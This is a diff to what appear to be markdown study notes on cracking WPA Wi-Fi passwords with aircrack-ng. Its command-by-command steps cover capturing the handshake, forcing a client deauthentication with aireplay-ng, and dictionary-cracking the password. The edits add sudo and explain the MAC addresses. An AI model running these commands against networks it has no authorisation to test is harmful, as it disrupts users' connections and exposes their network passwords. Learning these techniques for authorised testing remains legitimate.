@@ -118,13 +118,13 @@ sudo aireplay-ng --test wlan0mon
 
 - confirm that LAN adapter is in 'monitor mode' using `iwconfig`;
 
-- find the BSSID and chanel of the access point using `sudo airodump-ng wlan0`;
+- find the BSSID and chanel of the access point using `sudo airodump-ng wlan0` (upper `BSSID` - MAC of access point, lower `BSSID` - MAC of access point, lower `STATION` - MAC of client);
 
-- capture the 4-way authentication handshake for the AP using `airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0`;
+- capture the 4-way authentication handshake for the AP using `sudo airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0` (`BSSID` of access point);
 
-- deauthenticate the wireless client in order to capture the handshake (may need to run multiple times, optional step) using `aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0`;
+- deauthenticate the wireless client in order to capture the handshake (may need to run multiple times, optional step) using `sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0` (`BSSID` of AP then client);
 
-- crack the password using dictionary using `aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap`;
+- crack the password using dictionary using `sudo aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap`;
 
 #### Notes
 
